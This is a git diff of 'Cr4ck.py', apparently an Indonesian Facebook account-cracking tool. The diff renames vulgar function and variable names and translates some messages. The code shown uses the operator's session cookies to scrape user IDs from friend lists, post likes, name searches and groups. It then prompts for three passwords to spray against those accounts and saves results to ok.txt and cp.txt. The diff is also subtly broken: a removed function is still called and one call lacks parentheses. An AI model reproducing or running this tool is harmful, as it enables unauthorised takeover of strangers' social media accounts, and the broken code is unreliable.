@@ -10,16 +10,16 @@ import os,sys,re,time,json,random,requests
 from bs4 import BeautifulSoup as parser
 from concurrent.futures import ThreadPoolExecutor
 
-def croot():
+def yuk():
     os.system("git pull")
-def ikeh_ikeh_kimochi():
+def clear():
     os.system("clear")
-def aahh(s):
+def pii(s):
     for c in s + '\n':
         sys.stdout.write(c)
         sys.stdout.flush()
         time.sleep(1./300)
-def kontol():
+def legend():
     time.sleep(0.3)
     aahh("""\n\x1b[1;91m      ██████╗██████╗ ██╗  ██╗ ██████╗██╗  ██╗
      ██╔════╝██╔══██╗██║  ██║██╔════╝██║ ██╔╝
@@ -33,7 +33,7 @@ def kontol():
 \x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Facebook : https://www.facebook.com/fikritampan305
 \x1b[1;94m────────────────────────────────────────────────────""")
 
-def jembut():
+def daris():
     print("""\n\x1b[1;91m      ██████╗██████╗ ██╗  ██╗ ██████╗██╗  ██╗
      ██╔════╝██╔══██╗██║  ██║██╔════╝██║ ██╔╝
      ██║     ██████╔╝███████║██║     █████╔╝ 
@@ -46,13 +46,13 @@ def jembut():
 \x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Facebook : https://www.facebook.com/fikritampan305
 \x1b[1;94m────────────────────────────────────────────────────""")
 
-def yayanxd():
-    yayan=input("\n\033[00m\t   [\033[96m Press Enter To Return\033[97m ] ")
-    if yayan == "": 
+def syafiixd():
+    syafii=input("\n\033[00m\t   [\033[96m Press Enter To Return\033[97m ] ")
+    if syafii == "": 
        os.system("python Cr4ck.py")
     else:
        sys.exit("\n\033[1;97m [\033[1;91m•\033[1;97m] \033[1;91mGood Byee :')")
-def moch_yayan():
+def syafiiganteng():
     time.sleep(0.1)
     print("\033[97m [\033[96m01\033[97m] Start  Cr4ck ID")
     print("\033[97m [\033[96m02\033[97m] Tutor  How to Get Fb Cookies")
@@ -63,8 +63,8 @@ def moch_yayan():
     print("\x1b[1;94m────────────────────────────────────────────────────")
     time.sleep(0.1)
 
-    yayan=input("\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ")
-    if yayan == "1" or yayan =="01":
+    syafii=input("\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ")
+    if syafii == "1" or syafii =="01":
          mbasic = 'https://mbasic.facebook.com{}'
          global die,check,result, count
          id = []
@@ -78,8 +78,8 @@ def moch_yayan():
              try:
                     cek = open("cookies").read()
              except FileNotFoundError:
-                   ikeh_ikeh_kimochi()
-                   kontol()
+                   clear()
+                   daris()
                    cek = input("\n\033[0;92m       [ \033[0;97mJangan Gunakan Akun Pribadi mu!!\033[0;92m]\n\n\033[97m [\033[91m?\033[97m] Cookies \033[1;91m: \033[1;96m")
                    print('\n\033[97m [\033[92m+\033[97m] \033[92mLoading.......')
              cek = {"cookie":cek}
@@ -100,7 +100,7 @@ def moch_yayan():
                      except :
                              pass
                      return cek["cookie"]
-                     aahh('\033[1;97m[\033[1;94m√\033[1;97m] \033[1;92mLogin Successfully')
+                     pii('\033[1;97m[\033[1;94m√\033[1;97m] \033[1;92mLogin Successfully')
              else:
                   os.system("xdg-open https://youtu.be/DF7bUCn0GFY") 
                   os.system('rm -rf cookies')
@@ -155,7 +155,7 @@ def moch_yayan():
                         continue
                  else:
                         id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
-                 print('\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m' + str(len(id)) + " \033[1;97mProcess Of Retrieving ID... ",end="")
+                 print('\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m' + str(len(id)) + " \033[1;97mSedang Mengambil ID... ",end="")
              if 'Lihat Teman Lain' in str(raw):
                  getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
              return id
@@ -175,7 +175,7 @@ def moch_yayan():
                          id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                  else:
                          id.append(user[1] + "|" + user[0].split('/')[1])
-                 print(f'\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ',end="")
+                 print(f'\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mSedang Mengambil ID... ',end="")
              if 'Lihat Selengkapnya' in str(like):
                  getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
              return id
@@ -187,7 +187,7 @@ def moch_yayan():
                          id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                   else:
                          id.append(user[1] + "|" + user[0].split("?")[0])
-                  print(f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ",end="")
+                  print(f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mSedang Mengambil ID... ",end="")
              if "Lihat Hasil Selanjutnya" in str(search):
                   bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
              return id
@@ -199,7 +199,7 @@ def moch_yayan():
                          id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
                  else:
                          id.append(user[1] + "|" + user[0])
-                 print(f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ",end="")
+                 print(f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mSedang Mengambil ID... ",end="")
              if "Lihat Selengkapnya" in str(grab):
                  grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
              return id
@@ -208,45 +208,45 @@ def moch_yayan():
                    ses = requests.Session()
                    kukis = masuk()
                    kuki = {'cookie':kukis}
-                   ikeh_ikeh_kimochi()
-                   kontol()
-                   aahh('\033[1;97m [\033[1;94m☺☺\033[1;97m] Selamat Datang Bos Kuh')
-                   aahh('\033[1;97m [\033[1;92m01\033[1;97m] Crack From ID Friend')
-                   aahh('\033[1;97m [\033[1;92m02\033[1;97m] Crack From ID Link Posting')
-                   aahh('\033[1;97m [\033[1;92m03\033[1;97m] Crack From ID Search Name')
-                   aahh('\033[1;97m [\033[1;92m04\033[1;97m] Crack From ID Group ')
-                   aahh('\033[1;97m [\033[1;92m05\033[1;97m] Crack From ID Publick ')
-                   aahh('\033[1;97m [\033[1;92m06\033[1;97m] View Crack Results')
-                   aahh('\033[1;97m [\033[1;92m07\033[1;97m] Delete Cookies')
-                   aahh('\033[1;97m [\033[1;91m00\033[1;97m] Exit')
+                   clear()
+                   legend()
+                   pii('\033[1;97m [\033[1;94m☺☺\033[1;97m] Selamat Datang Bos Kuh')
+                   pii('\033[1;97m [\033[1;92m01\033[1;97m] Crack From ID Friend')
+                   pii('\033[1;97m [\033[1;92m02\033[1;97m] Crack From ID Link Posting')
+                   pii('\033[1;97m [\033[1;92m03\033[1;97m] Crack From ID Search Name')
+                   pii('\033[1;97m [\033[1;92m04\033[1;97m] Crack From ID Group ')
+                   pii('\033[1;97m [\033[1;92m05\033[1;97m] Crack From ID Publick ')
+                   pii('\033[1;97m [\033[1;92m06\033[1;97m] View Crack Results')
+                   pii('\033[1;97m [\033[1;92m07\033[1;97m] Delete Cookies')
+                   pii('\033[1;97m [\033[1;91m00\033[1;97m] Exit')
                    print('\x1b[1;94m────────────────────────────────────────────────────')
-                   memek = input('\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ')
-                   if memek =="":
+                   widiya = input('\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ')
+                   if widiya =="":
                          print("\n\n\033[00m [\033[91m!\033[00m] Wrong Input!")
-                         yayanxd()
-                   elif memek == '0' or memek =='00':
-                         aahh("\n\033[1;92m Thank you for using my tools.\n  Don't forget to subscribe to My YouTube Channel\n\n")
+                         syafiixd()
+                   elif widiya == '0' or widiya =='00':
+                         pii("\n\033[1;92m Thank you for using my tools.\n  Don't forget to subscribe to My YouTube Channel\n\n")
                          os.system('xdg-open https://youtube.com/channel/UCNvDaXoyAVCNJbSqtaXA-mg')
                          exit()                   	
-                   elif memek == '7' or memek =='07':
+                   elif widiya == '7' or widiya =='07':
                          print("\n\x1b[1;97m [\x1b[1;96m+\x1b[1;97m] \x1b[1;96mPlease Wait... ")
-                         aahh("\x1b[1;92m • 10")
-                         aahh("\x1b[1;93m •• 20")
-                         aahh("\x1b[1;94m ••• 30")
-                         aahh("\x1b[1;95m •••• 40")
-                         aahh("\x1b[1;96m ••••• 50")
-                         aahh("\x1b[1;97m •••••• 60")
-                         aahh("\x1b[1;92m ••••••• 70")
-                         aahh("\x1b[1;91m •••••••• 80")
-                         aahh("\x1b[1;96m ••••••••• 90")
-                         aahh("\x1b[1;94m •••••••••• 100%")
+                         pii("\x1b[1;92m • 10")
+                         pii("\x1b[1;93m •• 20")
+                         pii("\x1b[1;94m ••• 30")
+                         pii("\x1b[1;95m •••• 40")
+                         pii("\x1b[1;96m ••••• 50")
+                         pii("\x1b[1;97m •••••• 60")
+                         pii("\x1b[1;92m ••••••• 70")
+                         pii("\x1b[1;91m •••••••• 80")
+                         pii("\x1b[1;96m ••••••••• 90")
+                         pii("\x1b[1;94m •••••••••• 100%")
                          os.system("rm -rf cookies")
                          print("\n\x1b[1;97m [\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Deleted Successfully!")
-                         yayanxd()
-                   elif memek == '1' or memek =='01':
+                         syafiixd()
+                   elif widiya == '1' or widiya =='01':
                          url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
                          username = getid(mbasic.format(url["href"]))
-                   elif memek == '2' or memek =='02':
+                   elif widiya == '2' or widiya =='02':
                          username = input("\033[1;97m\n [\033[1;96m?\033[1;97m] Link Post \033[1;91m: \033[1;92m")
                          if username == "":
                                  exit("\033[00m[\033[91m!\033[00m] Cannot be empty!")
@@ -255,18 +255,18 @@ def moch_yayan():
                          elif 'www.facebook' in username:
                                  username = username.replace('m.facebook','mbasic.facebook.com')
                          username = fromlikes(username)
-                   elif memek == '3' or memek =='03':
+                   elif widiya == '3' or widiya =='03':
                          knf = input("\033[1;97m\n [\033[1;96m?\033[1;97m] The Name You Want To Search For \033[1;91m: \033[1;92m")
                          username = bysearch(mbasic.format('/search/people/?q='+knf))
                          if len(username) == 0:
                                  exit("\033[90m[\033[91m!\033[90m] No Name!")
-                   elif memek == '4' or memek =='04':
+                   elif widiya == '4' or widiya =='04':
                          print("\033[1;97m\n [\033[1;94m•\033[1;97m] Can Only Take \033[91m100 \033[00mID ")
                          grab = input("\033[1;97m[\033[1;96m?\033[1;97m] \033[00mID group \033[1;91m: \033[1;92m")
                          username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
                          if len(username) == 0:
                                  exit("\033[00m[\033[91m!\033[00m] Group ID None!")
-                   elif memek == '5' or memek =='05':
+                   elif widiya == '5' or widiya =='05':
                          knf = input("\033[1;97m\n [\033[1;96m?\033[1;97m] Username/Id \033[1;91m: \033[1;92m")
                          if knf.isdigit():
                                  user = "/profile.php?id=" + knf
@@ -277,7 +277,7 @@ def moch_yayan():
                                  username = getid(mbasic.format(user))
                          except TypeError:
                                  exit("\033[00m[\033[91m!\033[00m] \033[97mUser/ID Wrong!")
-                   elif memek == '6' or memek =='06':
+                   elif widiya == '6' or widiya =='06':
                          try:
                                  file1 = open("cp.txt").read()
                                  file2 = open("ok.txt").read()
@@ -302,19 +302,19 @@ def moch_yayan():
                                  exit("\n\033[00m[\033[91m!\033[00m] You Didn't Get Results")
                    else:
                          print("\n\n \033[00m[\033[91m!\033[00m] Wrong Input!")
-                         yayanxd()
+                         syafiixd()
                    print()
-                   ikeh_ikeh_kimochi()
-                   jembut()
+                   clear()
+                   daris()
                    print('\n\x1b[1;96m        ✰★✰╭⍝╮⎝҂⚆⏝⚆⍀⎠╭⍝╮✰★✰')
                    print('\x1b[1;95m     疊╔═╦═────••♽••─────═╦═╗疊')
                    print('\x1b[1;97m           Total ID\x1b[1;91m :\x1b[1;92m ' + str(len(id)) + "\n\x1b[1;95m     疊╚═╩═────••♽••─────═╩═╝疊\n",end="")       
                    expass = input("\n\033[1;97m [\033[1;96m?\033[1;97m] Add Password1 \033[1;91m: \033[1;92m")
                    expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password2 \033[1;91m: \033[1;92m")
                    expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password3 \033[1;91m: \033[1;92m")
-                   aahh('\x1b[1;94m────────────────────────────────────────────────────\n')
-                   ikeh_ikeh_kimochi()
-                   jembut()
+                   pii('\x1b[1;94m────────────────────────────────────────────────────\n')
+                   clear()
+                   legend()
                    print('\n\x1b[1;92m        ✰★✰╭⍝╮⎝҂⚆⏝⚆⍀⎠╭⍝╮✰★✰')
                    print('\x1b[1;97m     疊╔═╦═────••♽••─────═╦═╗疊')
                    print('\x1b[1;96m           Total ID\x1b[1;91m :\x1b[1;94m ' + str(len(id)) + "\n\x1b[1;97m     疊╚═╩═────••♽••─────═╩═╝疊\n",end="")
@@ -345,29 +345,29 @@ def moch_yayan():
                except requests.exceptions.ConnectionError:
                        exit("\n\n\033[00m  [\033[91m!\033[00m] no Connection")
 
-    elif yayan == "2" or yayan =="02":
+    elif syafii == "2" or syafii =="02":
          os.system("xdg-open https://youtu.be/72zvkSbVPOI") 
-         yayanxd()
-    elif yayan == "3" or yayan =="03":
+         syafiixd()
+    elif syafii == "3" or syafii =="03":
          os.system('xdg-open https://www.facebook.com/groups/1592269051080491')
-         yayanxd()
-    elif yayan == "4" or yayan =="04":
+         syafiixd()
+    elif syafii == "4" or syafii =="04":
          os.system('xdg-open https://www.facebook.com/groups/3877586212335618')
-         yayanxd()
-    elif yayan == "5" or yayan =="05":
+         syafiixd
+    elif syafii == "5" or syafii =="05":
          print("\n\n\x1b[1;97m      [ \x1b[1;92mPlease Wait While Updating The Tools \x1b[1;97m]\n")
          os.system("git pull")
          print("\n \x1b[1;97m[\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Successfully Updated!\n ")
-         yayanxd()
-    elif yayan == "0" or yayan =="00":
-         aahh("\n\033[1;92m Thank you for using my tools.\n  Don't forget to subscribe to My YouTube Channel\n\n")
+         syafiixd()
+    elif syafii == "0" or syafii =="00":
+         pii("\n\033[1;92m Thank you for using my tools.\n  Don't forget to subscribe to My YouTube Channel\n\n")
          os.system('xdg-open https://youtube.com/channel/UCNvDaXoyAVCNJbSqtaXA-mg')
          exit()                   	
 
 if __name__=="__main__":
-     ikeh_ikeh_kimochi()
-     croot()
-     ikeh_ikeh_kimochi()
-     kontol()
-     moch_yayan()
-     yayanxd()
+     clear()
+     yuk()
+     clear()
+     legend()
+     syafiiganteng()
+     syafiixd()
